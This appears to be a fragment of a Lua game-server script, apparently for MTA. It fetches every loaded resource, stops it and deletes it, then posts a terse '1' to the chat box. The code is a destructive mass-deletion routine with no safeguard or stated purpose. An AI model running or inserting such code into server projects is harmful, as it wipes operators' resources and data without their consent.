 --Get all resources
    local resourceTable = getResources ( ) 
    for resourceKey, resourceValue in ipairs ( resourceTable ) do
        local resourceName = getResourceName ( resourceValue )
        stopResource ( resourceValue )
        local deleted = deleteResource ( resourceName )
    end
outputChatBox("1")
